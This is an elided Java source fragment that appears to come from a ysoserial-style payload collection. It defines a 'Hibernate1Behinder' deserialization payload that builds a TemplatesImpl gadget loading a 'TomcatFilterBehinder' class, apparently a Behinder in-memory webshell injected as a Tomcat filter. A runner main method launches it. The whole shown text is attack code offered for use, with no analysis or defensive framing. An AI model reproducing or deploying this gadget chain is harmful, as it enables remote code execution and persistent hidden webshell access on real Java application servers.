...
public class Hibernate1Behinder implements ObjectPayload<Object>, DynamicDependencies {
    ...
    public Object getObject ( String command ) throws Exception {
        Object tpl = Gadgets.createTemplatesImpl(null, TomcatFilterBehinder.class);
    ...
    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(Hibernate1Behinder.class, args);
    }
}
